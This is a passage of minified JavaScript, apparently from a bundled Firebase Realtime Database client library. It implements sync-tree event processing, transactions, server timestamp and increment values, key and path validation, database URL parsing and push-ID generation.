source."),a=l.source.tagged||e.serverCache.isFiltered(),s=Cp(t,e,l.path,l.children,r,i,a,o))}else if(n.type===Yt.ACK_USER_WRITE){let l=n;l.revert?s=OF(t,e,l.path,r,i,o):s=RF(t,e,l.path,l.affectedTree,r,i,o)}else if(n.type===Yt.LISTEN_COMPLETE)s=xF(t,e,n.path,r,o);else throw Jn("Unknown operation type: "+n.type);let c=o.getChanges();return MF(e,s,c),{viewCache:s,changes:c}}function MF(t,e,n){let r=e.eventCache;if(r.isFullyInitialized()){let i=r.getNode().isLeafNode()||r.getNode().isEmpty(),o=mp(t);(n.length>0||!t.eventCache.isFullyInitialized()||i&&!r.getNode().equals(o)||!r.getNode().getPriority().equals(o.getPriority()))&&n.push(rF(mp(e)))}}function cC(t,e,n,r,i,o){let s=e.eventCache;if(ol(r,n)!=null)return e;{let a,c;if(L(n))if(m(e.serverCache.isFullyInitialized(),"If change path is empty, we must have complete server data"),e.serverCache.isFiltered()){let l=pr(e),u=l instanceof ee?l:ee.EMPTY_NODE,d=iC(r,u);a=t.filter.updateFullNode(e.eventCache.getNode(),d,o)}else{let l=_p(r,pr(e));a=t.filter.updateFullNode(e.eventCache.getNode(),l,o)}else{let l=F(n);if(l===".priority"){m(Tn(n)===1,"Can't have a priority with additional path components");let u=s.getNode();c=e.serverCache.getNode();let d=cE(r,n,u,c);d!=null?a=t.filter.updatePriority(u,d):a=s.getNode()}else{let u=X(n),d;if(s.isCompleteForChild(l)){c=e.serverCache.getNode();let h=cE(r,n,s.getNode(),c);h!=null?d=s.getNode().getImmediateChild(l).updateChild(u,h):d=s.getNode().getImmediateChild(l)}else d=Lp(r,l,e.serverCache);d!=null?a=t.filter.updateChild(s.getNode(),l,d,u,i,o):a=s.getNode()}}return cs(e,a,s.isFullyInitialized()||L(n),t.filter.filtersNodes())}}function sl(t,e,n,r,i,o,s,a){let c=e.serverCache,l,u=s?t.filter:t.filter.getIndexedFilter();if(L(n))l=u.updateFullNode(c.getNode(),r,null);else if(u.filtersNodes()&&!c.isFiltered()){let f=c.getNode().updateChild(n,r);l=u.updateFullNode(c.getNode(),f,null)}else{let f=F(n);if(!c.isCompleteForPath(n)&&Tn(n)>1)return e;let g=X(n),C=c.getNode().getImmediateChild(f).updateChild(g,r);f===".priority"?l=u.updatePriority(c.getNode(),C):l=u.updateChild(c.getNode(),f,C,g,aC,null)}let d=XE(e,l,c.isFullyInitialized()||L(n),u.filtersNodes()),h=new ds(i,d,o);return cC(t,d,n,i,h,a)}function Ep(t,e,n,r,i,o,s){let a=e.eventCache,c,l,u=new ds(i,e,o);if(L(n))l=t.filter.updateFullNode(e.eventCache.getNode(),r,s),c=cs(e,l,!0,t.filter.filtersNodes());else{let d=F(n);if(d===".priority")l=t.filter.updatePriority(e.eventCache.getNode(),r),c=cs(e,l,a.isFullyInitialized(),a.isFiltered());else{let h=X(n),f=a.getNode().getImmediateChild(d),g;if(L(h))g=r;else{let _=u.getCompleteChild(d);_!=null?jE(h)===".priority"&&_.getChild(BE(h)).isEmpty()?g=_:g=_.updateChild(h,r):g=ee.EMPTY_NODE}if(f.equals(g))c=e;else{let _=t.filter.updateChild(a.getNode(),d,g,h,u,s);c=cs(e,_,a.isFullyInitialized(),t.filter.filtersNodes())}}}return c}function lE(t,e){return t.eventCache.isCompleteForChild(e)}function NF(t,e,n,r,i,o,s){let a=e;return r.foreach((c,l)=>{let u=de(n,c);lE(e,F(u))&&(a=Ep(t,a,u,l,i,o,s))}),r.foreach((c,l)=>{let u=de(n,c);lE(e,F(u))||(a=Ep(t,a,u,l,i,o,s))}),a}function uE(t,e,n){return n.foreach((r,i)=>{e=e.updateChild(r,i)}),e}function Cp(t,e,n,r,i,o,s,a){if(e.serverCache.getNode().isEmpty()&&!e.serverCache.isFullyInitialized())return e;let c=e,l;L(n)?l=r:l=new Pe(null).setTree(n,r);let u=e.serverCache.getNode();return l.children.inorderTraversal((d,h)=>{if(u.hasChild(d)){let f=e.serverCache.getNode().getImmediateChild(d),g=uE(t,f,h);c=sl(t,c,new Q(d),g,i,o,s,a)}}),l.children.inorderTraversal((d,h)=>{let f=!e.serverCache.isCompleteForChild(d)&&h.value===null;if(!u.hasChild(d)&&!f){let g=e.serverCache.getNode().getImmediateChild(d),_=uE(t,g,h);c=sl(t,c,new Q(d),_,i,o,s,a)}}),c}function RF(t,e,n,r,i,o,s){if(ol(i,n)!=null)return e;let a=e.serverCache.isFiltered(),c=e.serverCache;if(r.value!=null){if(L(n)&&c.isFullyInitialized()||c.isCompleteForPath(n))return sl(t,e,n,c.getNode().getChild(n),i,o,a,s);if(L(n)){let l=new Pe(null);return c.getNode().forEachChild(Si,(u,d)=>{l=l.set(new Q(u),d)}),Cp(t,e,n,l,i,o,a,s)}else return e}else{let l=new Pe(null);return r.foreach((u,d)=>{let h=de(n,u);c.isCompleteForPath(h)&&(l=l.set(u,c.getNode().getChild(h)))}),Cp(t,e,n,l,i,o,a,s)}}function xF(t,e,n,r,i){let o=e.serverCache,s=XE(e,o.getNode(),o.isFullyInitialized()||L(n),o.isFiltered());return cC(t,s,n,r,aC,i)}function OF(t,e,n,r,i,o){let s;if(ol(r,n)!=null)return e;{let a=new ds(r,e,i),c=e.eventCache.getNode(),l;if(L(n)||F(n)===".priority"){let u;if(e.serverCache.isFullyInitialized())u=_p(r,pr(e));else{let d=e.serverCache.getNode();m(d instanceof ee,"serverChildren would be complete if leaf node"),u=iC(r,d)}u=u,l=t.filter.updateFullNode(c,u,o)}else{let u=F(n),d=Lp(r,u,e.serverCache);d==null&&e.serverCache.isCompleteForChild(u)&&(d=c.getImmediateChild(u)),d!=null?l=t.filter.updateChild(c,u,d,X(n),a,o):e.eventCache.getNode().hasChild(u)?l=t.filter.updateChild(c,u,ee.EMPTY_NODE,X(n),a,o):l=c,l.isEmpty()&&e.serverCache.isFullyInitialized()&&(s=_p(r,pr(e)),s.isLeafNode()&&(l=t.filter.updateFullNode(l,s,o)))}return s=e.serverCache.isFullyInitialized()||ol(r,K())!=null,cs(e,l,s,t.filter.filtersNodes())}}function PF(t,e){let n=pr(t.viewCache_);return n&&(t.query._queryParams.loadsAllData()||!L(e)&&!n.getImmediateChild(F(e)).isEmpty())?n.getChild(e):null}function dE(t,e,n,r){e.type===Yt.MERGE&&e.source.queryId!==null&&(m(pr(t.viewCache_),"We should always have a full cache before handling merges"),m(mp(t.viewCache_),"Missing event cache, even though we have a server cache"));let i=t.viewCache_,o=AF(t.processor_,i,e,n,r);return TF(t.processor_,o.viewCache),m(o.viewCache.serverCache.isFullyInitialized()||!i.serverCache.isFullyInitialized(),"Once a server snap is complete, it should never go back"),t.viewCache_=o.viewCache,kF(t,o.changes,o.viewCache.eventCache.getNode(),null)}function kF(t,e,n,r){let i=r?[r]:t.eventRegistrations_;return uF(t.eventGenerator_,e,n,i)}var hE;function FF(t){m(!hE,"__referenceConstructor has already been defined"),hE=t}function Vp(t,e,n,r){let i=e.source.queryId;if(i!==null){let o=t.views.get(i);return m(o!=null,"SyncTree gave us an op for an invalid query."),dE(o,e,n,r)}else{let o=[];for(let s of t.views.values())o=o.concat(dE(s,e,n,r));return o}}function jp(t,e){let n=null;for(let r of t.views.values())n=n||PF(r,e);return n}var fE;function LF(t){m(!fE,"__referenceConstructor has already been defined"),fE=t}var al=class{constructor(e){this.listenProvider_=e,this.syncPointTree_=new Pe(null),this.pendingWriteTree_=bF(),this.tagToQueryMap=new Map,this.queryToTagMap=new Map}};function lC(t,e,n,r,i){return pF(t.pendingWriteTree_,e,n,r,i),i?ul(t,new Ri(KE(),e,n)):[]}function dr(t,e,n=!1){let r=gF(t.pendingWriteTree_,e);if(mF(t.pendingWriteTree_,e)){let o=new Pe(null);return r.snap!=null?o=o.set(K(),!0):Ze(r.children,s=>{o=o.set(new Q(s),!0)}),ul(t,new gp(r.path,o,n))}else return[]}function ll(t,e,n){return ul(t,new Ri(ZE(),e,n))}function VF(t,e,n){let r=Pe.fromObject(n);return ul(t,new il(ZE(),e,r))}function jF(t,e,n,r){let i=hC(t,r);if(i!=null){let o=fC(i),s=o.path,a=o.queryId,c=Ye(s,e),l=new Ri(QE(a),c,n);return pC(t,s,l)}else return[]}function UF(t,e,n,r){let i=hC(t,r);if(i){let o=fC(i),s=o.path,a=o.queryId,c=Ye(s,e),l=Pe.fromObject(n),u=new il(QE(a),c,l);return pC(t,s,u)}else return[]}function Up(t,e,n){let i=t.pendingWriteTree_,o=t.syncPointTree_.findOnPath(e,(s,a)=>{let c=Ye(s,e),l=jp(a,c);if(l)return l});return rC(i,e,o,n,!0)}function ul(t,e){return uC(e,t.syncPointTree_,null,tC(t.pendingWriteTree_,K()))}function uC(t,e,n,r){if(L(t.path))return dC(t,e,n,r);{let i=e.get(K());n==null&&i!=null&&(n=jp(i,K()));let o=[],s=F(t.path),a=t.operationForChild(s),c=e.children.get(s);if(c&&a){let l=n?n.getImmediateChild(s):null,u=oC(r,s);o=o.concat(uC(a,c,l,u))}return i&&(o=o.concat(Vp(i,t,r,n))),o}}function dC(t,e,n,r){let i=e.get(K());n==null&&i!=null&&(n=jp(i,K()));let o=[];return e.children.inorderTraversal((s,a)=>{let c=n?n.getImmediateChild(s):null,l=oC(r,s),u=t.operationForChild(s);u&&(o=o.concat(dC(u,a,c,l)))}),i&&(o=o.concat(Vp(i,t,r,n))),o}function hC(t,e){return t.tagToQueryMap.get(e)}function fC(t){let e=t.indexOf("$");return m(e!==-1&&e<t.length-1,"Bad queryKey."),{queryId:t.substr(e+1),path:new Q(t.substr(0,e))}}function pC(t,e,n){let r=t.syncPointTree_.get(e);m(r,"Missing sync point for query tag that we're tracking");let i=tC(t.pendingWriteTree_,e);return Vp(r,n,i,null)}var Dp=class t{constructor(e){this.node_=e}getImmediateChild(e){let n=this.node_.getImmediateChild(e);return new t(n)}node(){return this.node_}},bp=class t{constructor(e,n){this.syncTree_=e,this.path_=n}getImmediateChild(e){let n=de(this.path_,e);return new t(this.syncTree_,n)}node(){return Up(this.syncTree_,this.path_)}},BF=function(t){return t=t||{},t.timestamp=t.timestamp||new Date().getTime(),t},pE=function(t,e,n){if(!t||typeof t!="object")return t;if(m(".sv"in t,"Unexpected leaf node or priority contents"),typeof t[".sv"]=="string")return $F(t[".sv"],e,n);if(typeof t[".sv"]=="object")return HF(t[".sv"],e);m(!1,"Unexpected server value: "+JSON.stringify(t,null,2))},$F=function(t,e,n){switch(t){case"timestamp":return n.timestamp;default:m(!1,"Unexpected server value: "+t)}},HF=function(t,e,n){t.hasOwnProperty("increment")||m(!1,"Unexpected server value: "+JSON.stringify(t,null,2));let r=t.increment;typeof r!="number"&&m(!1,"Unexpected increment value: "+r);let i=e.node();if(m(i!==null&&typeof i<"u","Expected ChildrenNode.EMPTY_NODE for nulls"),!i.isLeafNode())return r;let s=i.getValue();return typeof s!="number"?r:s+r},WF=function(t,e,n,r){return Bp(e,new bp(n,t),r)},gC=function(t,e,n){return Bp(t,new Dp(e),n)};function Bp(t,e,n){let r=t.getPriority().val(),i=pE(r,e.getImmediateChild(".priority"),n),o;if(t.isLeafNode()){let s=t,a=pE(s.getValue(),e,n);return a!==s.getValue()||i!==s.getPriority().val()?new Mi(a,ye(i)):t}else{let s=t;return o=s,i!==s.getPriority().val()&&(o=o.updatePriority(new Mi(i))),s.forEachChild(Ce,(a,c)=>{let l=Bp(c,e.getImmediateChild(a),n);l!==c&&(o=o.updateImmediateChild(a,l))}),o}}var hs=class{constructor(e="",n=null,r={children:{},childCount:0}){this.name=e,this.parent=n,this.node=r}};function $p(t,e){let n=e instanceof Q?e:new Q(e),r=t,i=F(n);for(;i!==null;){let o=Xn(r.node.children,i)||{children:{},childCount:0};r=new hs(i,r,o),n=X(n),i=F(n)}return r}function ki(t){return t.node.value}function mC(t,e){t.node.value=e,Sp(t)}function vC(t){return t.node.childCount>0}function zF(t){return ki(t)===void 0&&!vC(t)}function dl(t,e){Ze(t.node.children,(n,r)=>{e(new hs(n,t,r))})}function yC(t,e,n,r){n&&!r&&e(t),dl(t,i=>{yC(i,e,!0,r)}),n&&r&&e(t)}function GF(t,e,n){let r=n?t:t.parent;for(;r!==null;){if(e(r))return!0;r=r.parent}return!1}function ms(t){return new Q(t.parent===null?t.name:ms(t.parent)+"/"+t.name)}function Sp(t){t.parent!==null&&qF(t.parent,t.name,t)}function qF(t,e,n){let r=zF(n),i=_t(t.node.children,e);r&&i?(delete t.node.children[e],t.node.childCount--,Sp(t)):!r&&!i&&(t.node.children[e]=n.node,t.node.childCount++,Sp(t))}var YF=/[\[\].#$\/\u0000-\u001F\u007F]/,KF=/[\[\].#$\u0000-\u001F\u007F]/,Uf=10*1024*1024,_C=function(t){return typeof t=="string"&&t.length!==0&&!YF.test(t)},IC=function(t){return typeof t=="string"&&t.length!==0&&!KF.test(t)},ZF=function(t){return t&&(t=t.replace(/^\/*\.info(\/|$)/,"/")),IC(t)};var wC=function(t,e,n,r){r&&e===void 0||Hp(Dc(t,"value"),e,n)},Hp=function(t,e,n){let r=n instanceof Q?new ep(n,t):n;if(e===void 0)throw new Error(t+"contains undefined "+lr(r));if(typeof e=="function")throw new Error(t+"contains a function "+lr(r)+" with contents = "+e.toString());if(wE(e))throw new Error(t+"contains "+e.toString()+" "+lr(r));if(typeof e=="string"&&e.length>Uf/3&&Bo(e)>Uf)throw new Error(t+"contains a string greater than "+Uf+" utf8 bytes "+lr(r)+" ('"+e.substring(0,50)+"...')");if(e&&typeof e=="object"){let i=!1,o=!1;if(Ze(e,(s,a)=>{if(s===".value")i=!0;else if(s!==".priority"&&s!==".sv"&&(o=!0,!_C(s)))throw new Error(t+" contains an invalid key ("+s+") "+lr(r)+`.  Keys must be non-empty strings and can't contain ".", "#", "$", "/", "[", or "]"`);Wk(r,s),Hp(t,a,r),zk(r)}),i&&o)throw new Error(t+' contains ".value" child '+lr(r)+" in addition to actual children.")}};var EC=function(t,e,n,r){if(!(r&&n===void 0)&&!IC(n))throw new Error(Dc(t,e)+'was an invalid path = "'+n+`". Paths must be non-empty strings and can't contain ".", "#", "$", "[", or "]"`)},QF=function(t,e,n,r){n&&(n=n.replace(/^\/*\.info(\/|$)/,"/")),EC(t,e,n,r)},CC=function(t,e){if(F(e)===".info")throw new Error(t+" failed = Can't modify data under /.info/")},JF=function(t,e){let n=e.path.toString();if(typeof e.repoInfo.host!="string"||e.repoInfo.host.length===0||!_C(e.repoInfo.namespace)&&e.repoInfo.host.split(":")[0]!=="localhost"||n.length!==0&&!ZF(n))throw new Error(Dc(t,"url")+`must be a valid firebase URL and the path can't contain ".", "#", "$", "[", or "]".`)};var Tp=class{constructor(){this.eventLists_=[],this.recursionDepth_=0}};function DC(t,e){let n=null;for(let r=0;r<e.length;r++){let i=e[r],o=i.getPath();n!==null&&!$E(o,n.path)&&(t.eventLists_.push(n),n=null),n===null&&(n={events:[],path:o}),n.events.push(i)}n&&t.eventLists_.push(n)}function Zt(t,e,n){DC(t,n),XF(t,r=>at(r,e)||at(e,r))}function XF(t,e){t.recursionDepth_++;let n=!0;for(let r=0;r<t.eventLists_.length;r++){let i=t.eventLists_[r];if(i){let o=i.path;e(o)?(eL(t.eventLists_[r]),t.eventLists_[r]=null):n=!1}}n&&(t.eventLists_=[]),t.recursionDepth_--}function eL(t){for(let e=0;e<t.events.length;e++){let n=t.events[e];if(n!==null){t.events[e]=null;let r=n.getEventRunner();hr&&Ee("event: "+n.toString()),Pi(r)}}}var tL="repo_interrupt",nL=25,Ap=class{constructor(e,n,r,i){this.repoInfo_=e,this.forceRestClient_=n,this.authTokenProvider_=r,this.appCheckProvider_=i,this.dataUpdateCount=0,this.statsListener_=null,this.eventQueue_=new Tp,this.nextWriteId_=1,this.interceptServerDataCallback_=null,this.onDisconnect_=rl(),this.transactionQueueTree_=new hs,this.persistentConnection_=null,this.key=this.repoInfo_.toURLString()}toString(){return(this.repoInfo_.secure?"https://":"http://")+this.repoInfo_.host}};function rL(t,e,n){if(t.stats_=Pp(t.repoInfo_),t.forceRestClient_||_k())t.server_=new up(t.repoInfo_,(r,i,o,s)=>{gE(t,r,i,o,s)},t.authTokenProvider_,t.appCheckProvider_),setTimeout(()=>mE(t,!0),0);else{if(typeof n<"u"&&n!==null){if(typeof n!="object")throw new Error("Only objects are supported for option databaseAuthVariableOverride");try{he(n)}catch(r){throw new Error("Invalid authOverride provided: "+r)}}t.persistentConnection_=new kp(t.repoInfo_,e,(r,i,o,s)=>{gE(t,r,i,o,s)},r=>{mE(t,r)},r=>{iL(t,r)},t.authTokenProvider_,t.appCheckProvider_,n),t.server_=t.persistentConnection_}t.authTokenProvider_.addTokenChangeListener(r=>{t.server_.refreshAuthToken(r)}),t.appCheckProvider_.addTokenChangeListener(r=>{t.server_.refreshAppCheckToken(r.token)}),t.statsReporter_=wk(t.repoInfo_,()=>new pp(t.stats_,t.server_)),t.infoData_=new dp,t.infoSyncTree_=new al({startListening:(r,i,o,s)=>{let a=[],c=t.infoData_.getNode(r._path);return c.isEmpty()||(a=ll(t.infoSyncTree_,r._path,c),setTimeout(()=>{s("ok")},0)),a},stopListening:()=>{}}),zp(t,"connected",!1),t.serverSyncTree_=new al({startListening:(r,i,o,s)=>(t.server_.listen(r,o,i,(a,c)=>{let l=s(a,c);Zt(t.eventQueue_,r._path,l)}),[]),stopListening:(r,i)=>{t.server_.unlisten(r,i)}})}function bC(t){let n=t.infoData_.getNode(new Q(".info/serverTimeOffset")).val()||0;return new Date().getTime()+n}function Wp(t){return BF({timestamp:bC(t)})}function gE(t,e,n,r,i){t.dataUpdateCount++;let o=new Q(e);n=t.interceptServerDataCallback_?t.interceptServerDataCallback_(e,n):n;let s=[];if(i)if(r){let c=Uo(n,l=>ye(l));s=UF(t.serverSyncTree_,o,c,i)}else{let c=ye(n);s=jF(t.serverSyncTree_,o,c,i)}else if(r){let c=Uo(n,l=>ye(l));s=VF(t.serverSyncTree_,o,c)}else{let c=ye(n);s=ll(t.serverSyncTree_,o,c)}let a=o;s.length>0&&(a=hl(t,o)),Zt(t.eventQueue_,a,s)}function mE(t,e){zp(t,"connected",e),e===!1&&sL(t)}function iL(t,e){Ze(e,(n,r)=>{zp(t,n,r)})}function zp(t,e,n){let r=new Q("/.info/"+e),i=ye(n);t.infoData_.updateSnapshot(r,i);let o=ll(t.infoSyncTree_,r,i);Zt(t.eventQueue_,r,o)}function SC(t){return t.nextWriteId_++}function oL(t,e,n,r,i){Gp(t,"set",{path:e.toString(),value:n,priority:r});let o=Wp(t),s=ye(n,r),a=Up(t.serverSyncTree_,e),c=gC(s,a,o),l=SC(t),u=lC(t.serverSyncTree_,e,c,l,!0);DC(t.eventQueue_,u),t.server_.put(e.toString(),s.val(!0),(h,f)=>{let g=h==="ok";g||Oe("set at "+e+" failed: "+h);let _=dr(t.serverSyncTree_,l,!g);Zt(t.eventQueue_,e,_),cL(t,i,h,f)});let d=RC(t,e);hl(t,d),Zt(t.eventQueue_,d,[])}function sL(t){Gp(t,"onDisconnectEvents");let e=Wp(t),n=rl();hp(t.onDisconnect_,K(),(i,o)=>{let s=WF(i,o,t.serverSyncTree_,e);YE(n,i,s)});let r=[];hp(n,K(),(i,o)=>{r=r.concat(ll(t.serverSyncTree_,i,o));let s=RC(t,i);hl(t,s)}),t.onDisconnect_=rl(),Zt(t.eventQueue_,K(),r)}function aL(t){t.persistentConnection_&&t.persistentConnection_.interrupt(tL)}function Gp(t,...e){let n="";t.persistentConnection_&&(n=t.persistentConnection_.id+":"),Ee(n,...e)}function cL(t,e,n,r){e&&Pi(()=>{if(n==="ok")e(null);else{let i=(n||"error").toUpperCase(),o=i;r&&(o+=": "+r);let s=new Error(o);s.code=i,e(s)}})}function TC(t,e,n){return Up(t.serverSyncTree_,e,n)||ee.EMPTY_NODE}function qp(t,e=t.transactionQueueTree_){if(e||fl(t,e),ki(e)){let n=MC(t,e);m(n.length>0,"Sending zero length transaction queue"),n.every(i=>i.status===0)&&lL(t,ms(e),n)}else vC(e)&&dl(e,n=>{qp(t,n)})}function lL(t,e,n){let r=n.map(l=>l.currentWriteId),i=TC(t,e,r),o=i,s=i.hash();for(let l=0;l<n.length;l++){let u=n[l];m(u.status===0,"tryToSendTransactionQueue_: items in queue should all be run."),u.status=1,u.retryCount++;let d=Ye(e,u.path);o=o.updateChild(d,u.currentOutputSnapshotRaw)}let a=o.val(!0),c=e;t.server_.put(c.toString(),a,l=>{Gp(t,"transaction put response",{path:c.toString(),status:l});let u=[];if(l==="ok"){let d=[];for(let h=0;h<n.length;h++)n[h].status=2,u=u.concat(dr(t.serverSyncTree_,n[h].currentWriteId)),n[h].onComplete&&d.push(()=>n[h].onComplete(null,!0,n[h].currentOutputSnapshotResolved)),n[h].unwatcher();fl(t,$p(t.transactionQueueTree_,e)),qp(t,t.transactionQueueTree_),Zt(t.eventQueue_,e,u);for(let h=0;h<d.length;h++)Pi(d[h])}else{if(l==="datastale")for(let d=0;d<n.length;d++)n[d].status===3?n[d].status=4:n[d].status=0;else{Oe("transaction at "+c.toString()+" failed: "+l);for(let d=0;d<n.length;d++)n[d].status=4,n[d].abortReason=l}hl(t,e)}},s)}function hl(t,e){let n=AC(t,e),r=ms(n),i=MC(t,n);return uL(t,i,r),r}function uL(t,e,n){if(e.length===0)return;let r=[],i=[],s=e.filter(a=>a.status===0).map(a=>a.currentWriteId);for(let a=0;a<e.length;a++){let c=e[a],l=Ye(n,c.path),u=!1,d;if(m(l!==null,"rerunTransactionsUnderNode_: relativePath should not be null."),c.status===4)u=!0,d=c.abortReason,i=i.concat(dr(t.serverSyncTree_,c.currentWriteId,!0));else if(c.status===0)if(c.retryCount>=nL)u=!0,d="maxretry",i=i.concat(dr(t.serverSyncTree_,c.currentWriteId,!0));else{let h=TC(t,c.path,s);c.currentInputSnapshot=h;let f=e[a].update(h.val());if(f!==void 0){Hp("transaction failed: Data returned ",f,c.path);let g=ye(f);typeof f=="object"&&f!=null&&_t(f,".priority")||(g=g.updatePriority(h.getPriority()));let C=c.currentWriteId,R=Wp(t),te=gC(g,h,R);c.currentOutputSnapshotRaw=g,c.currentOutputSnapshotResolved=te,c.currentWriteId=SC(t),s.splice(s.indexOf(C),1),i=i.concat(lC(t.serverSyncTree_,c.path,te,c.currentWriteId,c.applyLocally)),i=i.concat(dr(t.serverSyncTree_,C,!0))}else u=!0,d="nodata",i=i.concat(dr(t.serverSyncTree_,c.currentWriteId,!0))}Zt(t.eventQueue_,n,i),i=[],u&&(e[a].status=2,function(h){setTimeout(h,Math.floor(0))}(e[a].unwatcher),e[a].onComplete&&(d==="nodata"?r.push(()=>e[a].onComplete(null,!1,e[a].currentInputSnapshot)):r.push(()=>e[a].onComplete(new Error(d),!1,null))))}fl(t,t.transactionQueueTree_);for(let a=0;a<r.length;a++)Pi(r[a]);qp(t,t.transactionQueueTree_)}function AC(t,e){let n,r=t.transactionQueueTree_;for(n=F(e);n!==null&&ki(r)===void 0;)r=$p(r,n),e=X(e),n=F(e);return r}function MC(t,e){let n=[];return NC(t,e,n),n.sort((r,i)=>r.order-i.order),n}function NC(t,e,n){let r=ki(e);if(r)for(let i=0;i<r.length;i++)n.push(r[i]);dl(e,i=>{NC(t,i,n)})}function fl(t,e){let n=ki(e);if(n){let r=0;for(let i=0;i<n.length;i++)n[i].status!==2&&(n[r]=n[i],r++);n.length=r,mC(e,n.length>0?n:void 0)}dl(e,r=>{fl(t,r)})}function RC(t,e){let n=ms(AC(t,e)),r=$p(t.transactionQueueTree_,e);return GF(r,i=>{Bf(t,i)}),Bf(t,r),yC(r,i=>{Bf(t,i)}),n}function Bf(t,e){let n=ki(e);if(n){let r=[],i=[],o=-1;for(let s=0;s<n.length;s++)n[s].status===3||(n[s].status===1?(m(o===s-1,"All SENT items should be at beginning of queue."),o=s,n[s].status=3,n[s].abortReason="set"):(m(n[s].status===0,"Unexpected transaction status in abort"),n[s].unwatcher(),i=i.concat(dr(t.serverSyncTree_,n[s].currentWriteId,!0)),n[s].onComplete&&r.push(n[s].onComplete.bind(null,new Error("set"),!1,null))));o===-1?mC(e,void 0):n.length=o+1,Zt(t.eventQueue_,ms(e),i);for(let s=0;s<r.length;s++)Pi(r[s])}}function dL(t){let e="",n=t.split("/");for(let r=0;r<n.length;r++)if(n[r].length>0){let i=n[r];try{i=decodeURIComponent(i.replace(/\+/g," "))}catch{}e+="/"+i}return e}function hL(t){let e={};t.charAt(0)==="?"&&(t=t.substring(1));for(let n of t.split("&")){if(n.length===0)continue;let r=n.split("=");r.length===2?e[decodeURIComponent(r[0])]=decodeURIComponent(r[1]):Oe(`Invalid query segment '${n}' in query '${t}'`)}return e}var vE=function(t,e){let n=fL(t),r=n.namespace;n.domain==="firebase.com"&&Kt(n.host+" is no longer supported. Please use <YOUR FIREBASE>.firebaseio.com instead"),(!r||r==="undefined")&&n.domain!=="localhost"&&Kt("Cannot parse Firebase url. Please use https://<YOUR FIREBASE>.firebaseio.com"),n.secure||dk();let i=n.scheme==="ws"||n.scheme==="wss";return{repoInfo:new Zc(n.host,n.secure,r,i,e,"",r!==n.subdomain),path:new Q(n.pathString)}},fL=function(t){let e="",n="",r="",i="",o="",s=!0,a="https",c=443;if(typeof t=="string"){let l=t.indexOf("//");l>=0&&(a=t.substring(0,l-1),t=t.substring(l+2));let u=t.indexOf("/");u===-1&&(u=t.length);let d=t.indexOf("?");d===-1&&(d=t.length),e=t.substring(0,Math.min(u,d)),u<d&&(i=dL(t.substring(u,d)));let h=hL(t.substring(Math.min(t.length,d)));l=e.indexOf(":"),l>=0?(s=a==="https"||a==="wss",c=parseInt(e.substring(l+1),10)):l=e.length;let f=e.slice(0,l);if(f.toLowerCase()==="localhost")n="localhost";else if(f.split(".").length<=2)n=f;else{let g=e.indexOf(".");r=e.substring(0,g).toLowerCase(),n=e.substring(g+1),o=r}"ns"in h&&(o=h.ns)}return{host:e,port:c,domain:n,subdomain:r,secure:s,scheme:a,pathString:i,namespace:o}};var yE="-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz",pL=function(){let t=0,e=[];return function(n){let r=n===t;t=n;let i,o=new Array(8);for(i=7;i>=0;i--)o[i]=yE.charAt(n%64),n=Math.floor(n/64);m(n===0,"Cannot push at time == 0");let s=o.join("");if(r){for(i=11;i>=0&&e[i]===63;i--)e[i]=0;e[i]++}else for(i=0;i<12;i++)e[i]=Math.floor(Math.random()*64);for(i=0;i<12;i++)s+=yE.charAt(e[i]);return m(s.length===20,"nextPushId: Length should be 20."),s}}();var Mp=class t{constructor(e,n,r,i){this._repo=e,this._path=n,this._queryParams=r,this._orderByCalled=i}get key(){return L(this._path)?null:jE(this._path)}get ref(){return new gr(this._repo,this._path)}get _queryIdentifier(){let e=rE(this._queryParams),n=Op(e);return n==="{}"?"default":n}get _queryObject(){return rE(this._queryParams)}isEqual(e){if(e=xe(e),!(e instanceof t))return!1;let n=this._repo===e._repo,r=$E(this._path,e._path),i=this._queryIdentifier===e._queryIdentifier;return n&&r&&i}toJSON(){return this.toString()}toString(){return this._repo.toString()+Hk(this._path)}};var gr=class t extends Mp{constructor(e,n){super(e,n,new lp,!1)}get parent(){let e=BE(this._path);return e===null?null:new t(this._repo,e)}get root(){let e=this;for(;e.parent!==null;)e=e.parent;return e}};function xC(t,e){return t=xe(t),t._checkNotDeleted("ref"),e!==void 0?cl(t._root,e):t._root}function cl(t,e){return t=xe(t),F(t._path)===null?QF("child","path",e,!1):EC("child","path",e,!1),new gr(t._repo,de(t._path,e))}function OC(t,e){t=xe(t),CC("push",t._path),wC("push",e,t._path,!0);let n=bC(t._repo),r=pL(n),i=cl(t,r),o=cl(t,r),s;return e!=null?s=Yp(o,e).then(()=>o):s=Promise.resolve(o),i.then=s.then.bind(s),i.catch=s.then.bind(s,void 0),i}function Yp(t,e){t=xe(t),CC("set",t._path),wC("set",e,t._path,!1);let n=new yn;return oL(t._repo,t._path,e,null,n.wrapCallback(()=>{})),n.promise}FF(gr);LF(gr);var gL="FIREBASE_DATABASE_EMULATOR_HOST",Np={},mL=!1;function vL(t,e,n,r){t.repoInfo_=new Zc(`${e}:${n}`,!1,t.repoInfo_.namespace,t.repoInfo_.webSocketOnly,t.repoInfo_.nodeAdmin,t.repoInfo_.persistenceKey,t.repoInfo_.includeNamespaceInQueryParams,!0),r&&(t.authTokenProvider_=r)}function yL(t,e,n,r,i){let o=r||t.options.databaseURL;o===void 0&&(t.options.projectId||Kt("Can't determine Firebase Database URL. Be sure to include  a Project ID when calling firebase.initializeApp()."),Ee("Using default host for project ",t.options.projectId),o=`${t.options.projectId}-default-rtdb.firebaseio.com`);let s=vE(o,i),a=s.repoInfo,c,l;typeof process<"u"&&process.env&&(l=process.env[gL]),l?(c=!0,o=`http://${l}?ns=${a.namespace}`,s=vE(o,i),a=s.repoInfo):c=!s.repoInfo.secure;let u=i&&c?new as(as.OWNER):new qf(t.name,t.options,e);JF("Invalid Firebase Database URL",s),L(s.path)||Kt("Database URL must point to the root of a Firebase Database (not including a child path).");let d=IL(a,t,u,new Gf(t.name,n));return new Rp(d,t)}function _L(t,e){let n=Np[e];(!n||n[t.key]!==t)&&Kt(`Database ${e}(${t.repoInfo_}) has already been deleted.`),aL(t),delete n[t.key]}function IL(t,e,n,r){let i=Np[e.name];i||(i={},Np[e.name]=i);let o=i[t.toURLString()];return o&&Kt("Database initialized multiple times. Please make sure the format of the database URL matches with each database() call."),o=new Ap(t,mL,n,r),i[t.toURLString()]=o,o}var Rp=class{constructor(e,n){this._repoInternal=e,this.app=n,this.type="database",this._instanceStarted=!1}get _repo(){return this._instanceStarted||(rL(this._repoInternal,this.app.options.appId,this.app.options.databaseAuthVariableOverride),this._instanceStarted=!0),this._repoInternal}get _root(){return 